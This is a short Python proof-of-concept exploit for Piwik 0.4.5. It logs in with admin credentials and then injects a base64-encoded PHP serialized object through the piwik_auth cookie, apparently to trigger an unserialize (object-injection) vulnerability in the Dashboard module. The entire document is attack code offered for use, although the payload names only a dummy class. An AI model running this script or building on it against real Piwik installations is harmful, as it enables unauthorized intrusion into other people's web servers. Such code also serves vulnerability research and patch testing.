# Piwik (0.4.5) - PoC
import requests
import sys
import base64
from bs4 import BeautifulSoup
import urllib.parse

def printUsageAndExit():
    print("[#] Usage: python [BASEURL] [USERID] [USERPW]")
    exit()

def login(baseurl, adminid, adminpw):
    URL = "{}{}".format(baseurl, "/index.php?module=CoreHome")
    login_data = {
            "form_login": adminid,
            "form_password": adminpw
            }
    with requests.Session() as session:
        r = session.post(URL, data = login_data)
        if(r.text.find("form_login") > -1):
            print("[!] Login Failed!");
            exit()
        else:
            return session

if __name__ != '__main__':
    exit()

if(len(sys.argv) < 4):
    printUsageAndExit()

BASEURL = sys.argv[1]
ADMINID = sys.argv[2]
ADMINPW = sys.argv[3];

# Get Token (_sx_)
session = login(BASEURL, ADMINID, ADMINPW)
PAYLOAD = session.cookies.get_dict()
print(PAYLOAD)

TRIGGER_INPUT = 'O:17:"dummy_class_r353t":1:{s:12:"used_methods";a:0:{}}'
# Submit PAYLOAD
PAYLOAD['piwik_auth'] = "%3ADUMMY%3D"
PAYLOAD['piwik_auth'] += "{}".format(urllib.parse.quote(
                                base64.b64encode(TRIGGER_INPUT.encode('ascii'))))
session.cookies = requests.utils.cookiejar_from_dict(PAYLOAD)
poc_req = session.get("{}{}".format(BASEURL, "/index.php?module=Dashboard"),
                            params = PAYLOAD)
# print(poc_req.text)
